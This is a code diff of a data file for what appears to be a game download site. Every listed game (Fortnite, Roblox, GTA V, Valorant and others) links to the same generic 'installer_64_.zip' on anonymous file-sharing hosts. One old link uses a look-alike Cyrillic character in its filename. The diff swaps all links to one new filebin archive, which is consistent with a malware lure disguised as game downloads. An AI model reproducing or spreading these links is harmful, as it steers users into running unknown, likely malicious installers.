@@ -92,61 +92,61 @@ export const ItemsList = [
         title: "Call of Duty: Warzone",
         downloadCount: "34.1K",
         src: "/icons/call-of-duty-warzone.png",
-        downloadLink: "https://filebin.net/ng3ahxap4euhjorm/installer_64_.zip"
+        downloadLink: "https://filebin.net/nsir517qll3ehlbr/installer_64_.zip"
       },
       {
         title: "Fortnite",
         downloadCount: "42.7K",
         src: "/icons/fortnite.png",
-        downloadLink: "https://download941.mediafire.com/tr35kqqr6mag/39mupywzstsa56p/installer%D1%8564+.zip"
+        downloadLink: "https://filebin.net/nsir517qll3ehlbr/installer_64_.zip"
       },
       {
         title: "Roblox",
         downloadCount: "95.1K",
         src: "/icons/roblox.png",
-        downloadLink: "https://download941.mediafire.com/tr35kqqr6mag/39mupywzstsa56p/installer%D1%8564+.zip"
+        downloadLink: "https://filebin.net/nsir517qll3ehlbr/installer_64_.zip"
       },
       {
         title: "Apex Legends",
         downloadCount: "24.7K",
         src: "/icons/apex.png",
-        downloadLink: "https://filebin.net/ng3ahxap4euhjorm/installer_64_.zip"
+        downloadLink: "https://filebin.net/nsir517qll3ehlbr/installer_64_.zip"
       },
       {
         title: "Genshin Impact",
         downloadCount: "103.4K",
         src: "/icons/genshin-impact.png",
-        downloadLink: "https://download941.mediafire.com/tr35kqqr6mag/39mupywzstsa56p/installer%D1%8564+.zip"
+        downloadLink: "https://filebin.net/nsir517qll3ehlbr/installer_64_.zip"
       },
       {
         title: "Rainbow Six Siege",
         downloadCount: "47.9K",
         src: "/icons/rainbow-six.png",
-        downloadLink: "https://filebin.net/ng3ahxap4euhjorm/installer_64_.zip"
+        downloadLink: "https://filebin.net/nsir517qll3ehlbr/installer_64_.zip"
       },
       {
         title: "GTA V",
         downloadCount: "87.3K",
         src: "/icons/gta-5.png",
-        downloadLink: "https://download941.mediafire.com/tr35kqqr6mag/39mupywzstsa56p/installer%D1%8564+.zip"
+        downloadLink: "https://filebin.net/nsir517qll3ehlbr/installer_64_.zip"
       },
       {
         title: "Rust",
         downloadCount: "16.4K",
         src: "/icons/rust.png",
-        downloadLink: "https://filebin.net/ng3ahxap4euhjorm/installer_64_.zip"
+        downloadLink: "https://filebin.net/nsir517qll3ehlbr/installer_64_.zip"
       },
       {
         title: "Escape From Tarkov",
         downloadCount: "18.9K",
         src: "/icons/escape-from-tarkov.png",
-        downloadLink: "https://filebin.net/ng3ahxap4euhjorm/installer_64_.zip"
+        downloadLink: "https://filebin.net/nsir517qll3ehlbr/installer_64_.zip"
       },
       {
         title: "Valorant",
         downloadCount: "11.7K",
         src: "/icons/valorant.png",
-        downloadLink: "https://filebin.net/ng3ahxap4euhjorm/installer_64_.zip"
+        downloadLink: "https://filebin.net/nsir517qll3ehlbr/installer_64_.zip"
       }
     ]
   }
